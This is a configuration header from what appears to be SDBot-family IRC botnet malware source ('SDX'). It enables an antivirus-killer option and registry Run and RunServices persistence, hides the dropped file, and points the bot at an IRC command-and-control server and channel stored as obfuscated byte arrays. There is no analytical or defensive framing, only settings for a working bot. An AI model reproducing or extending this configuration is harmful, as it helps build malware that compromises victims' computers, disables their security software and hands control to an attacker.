#pragma once

#define vername "SDX.amk.0x00"

//#define NO_AVKILL			// disables AV Killer
//#define NO_AVUPD			// disbales AV Updates
//#define NO_CONNCHECK		// disables check for internet connection
//#define NO_RNDNICK		// disables random nicks 
//#define NO_OSNICK			// disables showing OS version in nick
#define NO_CRYPTOPT			// disables encryption for settings

// macro for predefined aliases. (these are just examples, you can change them to whatever you want)
#define addpredefinedaliases() \
	addalias("op", "mode $chan +o $user");

// For Users + Password, see MAC.cpp

// bot configuration
const  int cryptkey			= 16;
	  char botid[]			= { 74, 68, 89, 123, 7, 31, 77, 11, 113, 26, 0 };
	  char server[]			= { 35, 35, 51, 18, 31, 28, 27, 10, 116, 114, 99, 98, 110, 102, 0 };
const  int port				= 6667;
	  char serverpass[]		= { 0 };
	  char channel[]		= { 50, 57, 51, 8, 7, 0 };
	  char chanpass[]		= { 0 };
	  char server2[]		= { 0 };
const  int port2			= 6667;
	  char channel2[]		= { 0 };
	  char chanpass2[]		= { 0 };
const BOOL topiccmd			= TRUE;
const BOOL rndfilename		= FALSE;
	  char filename[]		= { 102, 126, 115, 80, 95, 76, 27, 94, 57, 34, 0 };
const BOOL regrun			= TRUE;
const BOOL regrunservices	= TRUE;
	  char valuename[]		= { 70, 126, 115, 71, 70, 88, 70, 27, 18, 34, 63, 37, 48, 60, 0 };
const char prefix			= '.';
	  char version[]		= { 66, 83, 69, 13, 25, 87, 5, 11, 0 };
const  int Sysdir			= 0;
const  int hidefile			= 1;